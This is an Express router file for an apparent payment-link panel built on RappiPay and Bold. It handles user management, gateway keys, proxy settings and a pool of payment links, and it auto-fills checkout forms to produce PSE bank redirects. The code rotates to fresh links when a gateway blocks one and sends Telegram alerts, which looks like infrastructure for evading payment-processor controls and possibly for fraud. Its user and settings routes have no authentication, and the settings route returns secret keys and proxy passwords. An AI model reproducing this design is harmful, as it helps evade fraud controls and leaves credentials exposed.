import { Router, Request, Response } from 'express';
import {
  getGatewaySettings,
  updateGatewaySettings,
  detectGatewayFromUrl,
  getTransactions,
  GatewayProvider,
  getPanelUsers,
  findUserByPassword,
  createPanelUser,
  updatePanelUserPassword,
  deletePanelUser,
  getRappiLinksPool,
  getPoolSummary,
  getLinkLogs,
  addRappiLinksToPool,
  activateRappiLinkInPool,
  removeRappiLinkFromPool,
  markLinkBlockedAndRotate,
  recordLinkEvent,
  incrementRappiLinkUse,
  recordTransaction,
  updateTransactionStatus,
  subscribeDashboardUpdates,
  TransactionRecord,
} from '../services/settings.service';
import { verifyBoldAccountStatus } from '../services/bold-api.service';
import { executeFillReal, executeFillBold, executeFillBoldApi } from '../services/fill.service';
import { sendLinkRotationTelegramAlert } from '../services/telemetry.service';
import { startTrackingRappiPayment } from '../services/rappi-tracker.service';

const router = Router();

router.post('/auth', (req: Request, res: Response) => {
  try {
    const { password } = req.body || {};
    const user = findUserByPassword(String(password || ''));
    if (!user) {
      return res.status(401).json({
        ok: false,
        error: 'Contraseña de acceso inválida.',
      });
    }
    return res.json({
      ok: true,
      user: {
        id: user.id,
        name: user.name,
        role: user.role,
        firebaseEmail: user.firebaseEmail,
        firebaseUid: user.firebaseUid,
      },
    });
  } catch (err: any) {
    return res.status(500).json({
      ok: false,
      error: err.message || 'Error verificando contraseña',
    });
  }
});

router.get('/users', (_req: Request, res: Response) => {
  return res.json({
    ok: true,
    users: getPanelUsers(),
  });
});

router.post('/users', (req: Request, res: Response) => {
  try {
    const { name, password, role, firebaseUid, firebaseEmail } = req.body || {};
    const created = createPanelUser({ name, password, role, firebaseUid, firebaseEmail });
    return res.json({
      ok: true,
      user: created,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'Error creando el usuario',
    });
  }
});

router.put('/users/:id', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { password, name } = req.body || {};
    const updated = updatePanelUserPassword(id, password, name);
    return res.json({
      ok: true,
      user: updated,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'Error actualizando contraseña del usuario',
    });
  }
});

router.delete('/users/:id', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    deletePanelUser(id);
    return res.json({
      ok: true,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'Error eliminando el usuario',
    });
  }
});

function buildDashboardSnapshot() {
  const settings = getGatewaySettings();
  const detectedInfo = detectGatewayFromUrl(settings.paymentUrl);
  const transactions = getTransactions();

  const totalGenerated = transactions.length;
  const approvedList = transactions.filter((t) => t.status === 'APPROVED');
  const pendingList = transactions.filter(
    (t) => t.status === 'GENERATED' || t.status === 'PROCESSING' || t.status === 'INITIATED'
  );
  const totalApprovedAmount = approvedList.reduce((acc, t) => acc + (t.monto || 0), 0);
  const totalPendingAmount = pendingList.reduce((acc, t) => acc + (t.monto || 0), 0);
  const totalGeneratedAmount = transactions.reduce((acc, t) => acc + (t.monto || 0), 0);

  return {
    ok: true,
    settings,
    detectedInfo,
    rappiPool: getRappiLinksPool(),
    poolSummary: getPoolSummary(),
    linkLogs: getLinkLogs().slice(0, 60),
    stats: {
      totalGenerated,
      totalApproved: approvedList.length,
      totalPending: pendingList.length,
      totalErrors: transactions.filter((t) => t.status === 'ERROR' || t.status === 'REJECTED').length,
      totalApprovedAmount,
      totalPendingAmount,
      totalGeneratedAmount,
    },
    transactions: transactions.slice(0, 50),
  };
}

router.get('/settings', (_req: Request, res: Response) => {
  return res.json(buildDashboardSnapshot());
});

router.get('/stream', (req: Request, res: Response) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const sendSnapshot = () => {
    try {
      res.write(`data: ${JSON.stringify(buildDashboardSnapshot())}\n\n`);
    } catch {
      // ignore
    }
  };

  sendSnapshot();
  const unsubscribe = subscribeDashboardUpdates(sendSnapshot);
  const keepAlive = setInterval(() => {
    try {
      res.write(': ping\n\n');
    } catch {
      // ignore
    }
  }, 15000);

  req.on('close', () => {
    clearInterval(keepAlive);
    unsubscribe();
  });
});

router.put('/transactions/:id/status', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { status } = req.body || {};
    const validStatuses: TransactionRecord['status'][] = [
      'INITIATED',
      'PROCESSING',
      'GENERATED',
      'APPROVED',
      'REJECTED',
      'ERROR',
    ];
    if (!validStatuses.includes(status)) {
      return res.status(400).json({ ok: false, error: 'Estado no válido' });
    }
    updateTransactionStatus(id, status);
    return res.json(buildDashboardSnapshot());
  } catch (err: any) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

router.put('/settings', (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const patch: Record<string, any> = {};

    if (typeof body.paymentUrl === 'string') {
      patch.paymentUrl = body.paymentUrl.trim();
    }
    if (typeof body.rappiUrl === 'string') {
      patch.rappiUrl = body.rappiUrl.trim();
    }
    if (typeof body.boldUrl === 'string') {
      patch.boldUrl = body.boldUrl.trim();
    }
    if (typeof body.boldApiKey === 'string') {
      patch.boldApiKey = body.boldApiKey.trim();
    }
    if (typeof body.boldSecretKey === 'string') {
      patch.boldSecretKey = body.boldSecretKey.trim();
    }
    if (typeof body.boldMerchantName === 'string') {
      patch.boldMerchantName = body.boldMerchantName.trim();
    }
    if (typeof body.gatewayProvider === 'string') {
      const gp = body.gatewayProvider.toLowerCase();
      if (gp === 'rappipay' || gp === 'bold_api' || gp === 'bold') {
        patch.gatewayProvider = gp as GatewayProvider;
      }
    }
    if (typeof body.proxyHost === 'string') patch.proxyHost = body.proxyHost.trim();
    if (typeof body.proxyPort === 'string') patch.proxyPort = body.proxyPort.trim();
    if (typeof body.proxyUsername === 'string') patch.proxyUsername = body.proxyUsername.trim();
    if (typeof body.proxyPassword === 'string') patch.proxyPassword = body.proxyPassword.trim();

    const updated = updateGatewaySettings(patch);
    if (updated.gatewayProvider === 'rappipay' && updated.rappiUrl) {
      addRappiLinksToPool([updated.rappiUrl]);
    }
    const detectedInfo = detectGatewayFromUrl(updated.paymentUrl);

    return res.json({
      ok: true,
      settings: updated,
      detectedInfo,
      rappiPool: getRappiLinksPool(),
      poolSummary: getPoolSummary(),
    });
  } catch (err: any) {
    return res.status(500).json({
      ok: false,
      error: err.message || 'Error actualizando la configuración',
    });
  }
});

router.post('/verify-bold', async (req: Request, res: Response) => {
  try {
    const { boldApiKey, boldUrl } = req.body || {};
    const result = await verifyBoldAccountStatus(boldApiKey, boldUrl);
    return res.json(result);
  } catch (err: any) {
    return res.status(500).json({
      ok: false,
      status: 'ERROR',
      detail: err.message || 'Error al verificar cuenta en Bold',
    });
  }
});

// ==================== RAPPIPAY POOL ENDPOINTS ====================
router.post('/rappi-pool', (req: Request, res: Response) => {
  try {
    const { urls } = req.body || {};
    let list: string[] = [];
    if (Array.isArray(urls)) {
      list = urls.map(String);
    } else if (typeof urls === 'string') {
      list = urls
        .split(/[\r\n,]+/)
        .map((s) => s.trim())
        .filter(Boolean);
    }
    if (list.length === 0) {
      return res.status(400).json({ ok: false, error: 'Debes ingresar al menos un link de RappiPay.' });
    }
    const pool = addRappiLinksToPool(list);
    recordLinkEvent({
      type: 'ADDED',
      gateway: 'rappipay',
      url: list[0],
      reason: `Se agregaron ${list.length} link(s) a la cola de rotación automática.`,
    });
    return res.json({
      ok: true,
      rappiPool: pool,
      poolSummary: getPoolSummary(),
      linkLogs: getLinkLogs().slice(0, 60),
      settings: getGatewaySettings(),
    });
  } catch (err: any) {
    return res.status(400).json({ ok: false, error: err.message || 'Error agregando links al pool' });
  }
});

router.post('/rappi-pool/activate', (req: Request, res: Response) => {
  try {
    const { id } = req.body || {};
    const pool = activateRappiLinkInPool(String(id || ''));
    const settings = getGatewaySettings();
    recordLinkEvent({
      type: 'ROTATED',
      gateway: 'rappipay',
      url: settings.rappiUrl,
      nextUrl: settings.rappiUrl,
      reason: 'Activado manualmente desde el Dashboard.',
    });
    return res.json({
      ok: true,
      rappiPool: pool,
      poolSummary: getPoolSummary(),
      linkLogs: getLinkLogs().slice(0, 60),
      settings,
    });
  } catch (err: any) {
    return res.status(400).json({ ok: false, error: err.message || 'Error activando link' });
  }
});

router.delete('/rappi-pool/:id', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const pool = removeRappiLinkFromPool(id);
    return res.json({
      ok: true,
      rappiPool: pool,
      poolSummary: getPoolSummary(),
      settings: getGatewaySettings(),
    });
  } catch (err: any) {
    return res.status(400).json({ ok: false, error: err.message || 'Error eliminando link del pool' });
  }
});

// ==================== LIVE LINK TESTER / SIMULATOR ====================
router.post('/test-link', async (req: Request, res: Response) => {
  const startMs = Date.now();
  const settings = getGatewaySettings();
  const {
    url,
    monto = '15000',
    banco = 'NEQUI',
    tipo = 'Cédula de ciudadania',
    doc = '1020304050',
    nombre = 'Prueba Diagnóstico',
    email = 'prueba@gmail.com',
    celular = '3104567890',
  } = req.body || {};

  const targetUrl = String(url || settings.paymentUrl || '').trim();
  const detected = detectGatewayFromUrl(targetUrl);
  const cleanMonto = String(monto).replace(/\D/g, '') || '15000';
  const cleanDoc = String(doc).replace(/\D/g, '') || '1020304050';

  const gatewayToTest: GatewayProvider =
    detected.detected === 'rappipay'
      ? 'rappipay'
      : detected.detected === 'bold'
      ? settings.gatewayProvider === 'bold_api'
        ? 'bold_api'
        : 'bold'
      : settings.gatewayProvider;

  const testTx = recordTransaction({
    sessionId: `test_${Date.now()}`,
    nombre: `[PRUEBA] ${String(nombre)}`,
    doc: cleanDoc,
    banco: String(banco),
    monto: Number(cleanMonto),
    gateway: gatewayToTest,
    status: 'PROCESSING',
  });

  try {
    let result;
    if (gatewayToTest === 'rappipay') {
      result = await executeFillReal({
        url: targetUrl,
        monto: cleanMonto,
        banco: String(banco),
        tipo: String(tipo),
        doc: cleanDoc,
        nombre: String(nombre),
        email: String(email),
        celular: String(celular),
      });
      incrementRappiLinkUse(targetUrl);
    } else if (gatewayToTest === 'bold') {
      result = await executeFillBold({
        url: targetUrl,
        monto: cleanMonto,
        banco: String(banco),
        tipo: String(tipo),
        doc: cleanDoc,
        nombre: String(nombre),
        email: String(email),
        celular: String(celular),
      });
    } else {
      result = await executeFillBoldApi({
        url: targetUrl,
        monto: cleanMonto,
        banco: String(banco),
        tipo: String(tipo),
        doc: cleanDoc,
        nombre: String(nombre),
        email: String(email),
        celular: String(celular),
      });
    }

    const durationMs = Date.now() - startMs;
    updateTransactionStatus(testTx.id, 'GENERATED', {
      redirectUrl: result.redirect_url,
      referenceId: result.reference_id,
    });
    if (gatewayToTest === 'rappipay') {
      startTrackingRappiPayment({
        txId: testTx.id,
        sessionId: testTx.sessionId,
        redirectUrl: result.redirect_url,
        kushkiUrl: result.kushki_url,
        amount: Number(cleanMonto),
        banco: String(banco),
        nombre: String(nombre),
        doc: cleanDoc,
      });
    }
    recordLinkEvent({
      type: 'TEST_OK',
      gateway: gatewayToTest,
      url: targetUrl,
      nextUrl: result.redirect_url,
      reason: `Prueba exitosa (${(durationMs / 1000).toFixed(1)}s) -> Redirección generada correctamente.`,
    });

    return res.json({
      ok: true,
      status: 'ACTIVE',
      gatewayTested: gatewayToTest,
      testedUrl: targetUrl,
      redirectUrl: result.redirect_url,
      proxyIp: result.proxy_ip || 'Directo / API',
      durationMs,
      detail: 'El link está ACTIVO y generó redirección bancaria PSE correctamente.',
      rappiPool: getRappiLinksPool(),
      poolSummary: getPoolSummary(),
      linkLogs: getLinkLogs().slice(0, 60),
      transactions: getTransactions().slice(0, 50),
      settings: getGatewaySettings(),
    });
  } catch (err: any) {
    const durationMs = Date.now() - startMs;
    const reason = err.message || 'El link no respondió o fue rechazado por la pasarela.';
    updateTransactionStatus(testTx.id, 'ERROR', {
      errorMessage: reason,
    });

    const rotation = markLinkBlockedAndRotate(targetUrl, `Fallo en prueba manual: ${reason}`, gatewayToTest);
    sendLinkRotationTelegramAlert({
      gateway: gatewayToTest,
      blockedUrl: targetUrl,
      nextUrl: rotation.rotatedTo,
      reason: `Prueba desde Dashboard: ${reason}`,
      activeRemaining: rotation.activeRemaining,
      blockedTotal: rotation.blockedTotal,
    }).catch(() => {});

    return res.json({
      ok: false,
      status: 'BLOCKED',
      gatewayTested: gatewayToTest,
      testedUrl: targetUrl,
      rotatedTo: rotation.rotatedTo,
      durationMs,
      detail: reason,
      rappiPool: getRappiLinksPool(),
      poolSummary: getPoolSummary(),
      linkLogs: getLinkLogs().slice(0, 60),
      transactions: getTransactions().slice(0, 50),
      settings: getGatewaySettings(),
    });
  }
});

export default router;

